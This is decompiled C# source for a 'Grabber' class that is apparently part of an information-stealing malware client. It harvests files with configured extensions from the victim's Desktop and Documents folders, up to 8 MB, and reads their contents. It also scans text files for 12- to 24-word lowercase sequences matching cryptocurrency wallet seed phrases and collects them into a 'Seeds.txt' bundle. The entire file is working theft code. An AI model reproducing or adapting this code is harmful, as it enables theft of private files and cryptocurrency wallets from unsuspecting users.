using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using client.Helpers;
using client.Models;

namespace client.Body
{
	// Token: 0x02000044 RID: 68
	internal class Grabber
	{
		// Token: 0x1700006C RID: 108
		// (get) Token: 0x06000198 RID: 408 RVA: 0x00009120 File Offset: 0x00007320
		// (set) Token: 0x06000199 RID: 409 RVA: 0x00009127 File Offset: 0x00007327
		public static Extension ParsedSeeds { get; private set; }

		// Token: 0x0600019A RID: 410 RVA: 0x00009130 File Offset: 0x00007330
		public static List<DefaultFileStructure> Get()
		{
			List<DefaultFileStructure> list = new List<DefaultFileStructure>();
			List<string> ext = new List<string>();
			list.AddRange(Grabber.Parse(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Desktop", ext));
			list.ForEach(delegate(DefaultFileStructure x)
			{
				Grabber.FilePaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + x.FileName);
			});
			list.AddRange(Grabber.Parse(Environment.GetFolderPath(Environment.SpecialFolder.Personal), "Documents", ext));
			Grabber.ParsedSeeds = Grabber.ParseSeeds(Grabber.FilePaths);
			return list;
		}

		// Token: 0x0600019B RID: 411 RVA: 0x000091AC File Offset: 0x000073AC
		private static List<DefaultFileStructure> Parse(string sourcefold, string name, List<string> ext)
		{
			List<DefaultFileStructure> list = new List<DefaultFileStructure>();
			ext = Config.Extensions.Split(new char[]
			{
				','
			}).ToList<string>();
			try
			{
				string path = Environment.UserName + "\\" + name;
				long num = 0L;
				List<string> list2 = ParserHelper.FullDirList(new DirectoryInfo(sourcefold), "*.*", 3);
				list2.RemoveAll((string x) => !ext.Contains(new FileInfo(x).Extension));
				(from o in list2
				orderby new FileInfo(o).Length descending
				select o).Reverse<string>().ToList<string>();
				foreach (string text in list2)
				{
					if (num > 8388608L || new FileInfo(text).Length > 8388608L)
					{
						break;
					}
					list.Add(new DefaultFileStructure
					{
						Service = DataType.Grabber,
						FileName = Path.Combine(path, new FileInfo(text).FullName.Replace(sourcefold, null)),
						FileContent = FileHelper.ReadFile(text)
					});
					num += new FileInfo(text).Length;
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x0600019C RID: 412 RVA: 0x0000930C File Offset: 0x0000750C
		public static Extension ParseSeeds(List<string> files)
		{
			List<string> list = new List<string>();
			foreach (string text in from x in files
			where x.EndsWith(".txt")
			select x)
			{
				foreach (string text2 in File.ReadLines(text))
				{
					List<string> list2 = text2.Split(new char[]
					{
						' '
					}).ToList<string>();
					if (list2.Count != 0)
					{
						list2.RemoveAll((string s) => string.IsNullOrEmpty(s));
						List<string> splitted_v2 = new List<string>();
						splitted_v2.AddRange(list2);
						list2.ForEach(delegate(string s)
						{
							if (!Regex.IsMatch(s, "^[a-z]*$") || s.Length < 4 || s.Length > 13)
							{
								splitted_v2.RemoveAt(splitted_v2.IndexOf(s));
							}
						});
						list2 = splitted_v2;
						if (string.Join(" ", list2) == string.Join(" ", list2).ToLower() && (list2.Count<string>() == 12 || list2.Count<string>() == 15 || list2.Count<string>() == 18 || list2.Count<string>() == 21 || list2.Count<string>() == 24))
						{
							list.Add(string.Format("File path: {0}\nParsed seed-phrase: {1}", text, string.Join(" ", list2)));
						}
					}
				}
			}
			return new Extension
			{
				Path = "Files\\",
				FileName = "Seeds.txt",
				Data = list
			};
		}

		// Token: 0x040000F4 RID: 244
		private static List<string> FilePaths = new List<string>();
	}
}
